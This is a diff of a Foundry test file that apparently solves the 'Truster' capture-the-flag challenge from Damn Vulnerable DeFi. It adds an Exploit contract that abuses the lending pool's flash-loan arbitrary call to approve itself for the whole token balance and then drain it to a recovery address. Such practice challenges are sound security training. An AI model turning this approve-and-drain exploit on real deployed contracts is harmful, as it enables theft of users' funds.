@@ -6,6 +6,25 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
 
+    contract Exploit {
+        function run(
+            TrusterLenderPool pool,
+            DamnValuableToken token,
+            address recovery,
+            uint256 amount
+        ) external {
+            // ask the pool to approve *this* contract for the full balance
+            bytes memory data =
+                abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
+            pool.flashLoan(0, address(this), address(token), data);
+
+            // now pull the funds straight to the recovery account
+            token.transferFrom(address(pool), recovery, amount);
+        }
+    }
+
+
+
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -50,8 +69,11 @@ contract TrusterChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
+
     function test_truster() public checkSolvedByPlayer {
-        
+        Exploit exploit = new Exploit();
+        exploit.run(pool, token, recovery, TOKENS_IN_POOL);
+
     }
 
     /**
